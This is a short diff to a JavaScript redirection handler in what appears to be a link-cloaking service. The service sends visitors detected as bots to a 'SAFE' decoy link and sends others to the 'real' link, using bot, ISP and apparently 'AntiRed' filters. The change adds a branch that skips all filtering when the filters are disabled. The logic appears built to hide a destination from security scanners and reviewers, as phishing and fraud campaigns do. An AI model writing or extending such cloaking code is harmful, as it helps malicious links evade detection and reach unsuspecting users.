@@ -2192,8 +2192,11 @@ async function handleRedirection(user, req, res, linkData) {
     // 4. Filtering Logic
     let targetUrl = realLink;
     let redirectReason = null;
+    const allFiltersOff = !useBotFilter && !useAntiRed && !useIspFilter;
 
-    if (useBotFilter && isBot(req)) {
+    if (allFiltersOff) {
+        // All main filters disabled: send every visit straight to the real target.
+    } else if (useBotFilter && isBot(req)) {
         targetUrl = nonRealLink;
         redirectReason = 'Bot Detection';
         console.log(`[Proxy] Redirecting ${clientIp} to SAFE: Bot Detection (UA: ${userAgent})`);
